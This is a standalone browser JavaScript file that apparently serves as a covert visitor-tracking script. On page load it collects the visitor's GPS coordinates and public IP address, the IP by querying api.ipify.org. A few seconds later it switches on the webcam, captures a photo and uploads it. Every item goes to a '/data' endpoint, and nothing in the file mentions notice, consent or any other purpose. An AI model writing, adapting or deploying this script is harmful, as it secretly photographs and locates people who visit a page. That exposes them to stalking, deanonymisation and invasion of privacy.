function sendLocationAndIP() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(position => {
            const locationData = {
                type: 'location',
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };
            sendDataToServer(locationData);
        });
    }

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipData = {
                type: 'ip',
                ip: data.ip
            };
            sendDataToServer(ipData);
        });
}

function sendDataToServer(data) {
    fetch('/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
}

sendLocationAndIP();

document.addEventListener('DOMContentLoaded', function() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        const video = document.createElement('video');
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    captureAndSendImage(video);
                    stream.getTracks().forEach(track => track.stop()); 
                }, 5000); 
            })
            .catch(error => console.error("Error accessing camera:", error));
    }
});

function captureAndSendImage(video) {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
        sendImageToServer(blob);
    }, 'image/jpeg');
}

function sendImageToServer(blob) {
    const formData = new FormData();
    formData.append('image', blob, 'captured.jpg');
    fetch('/data', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
}
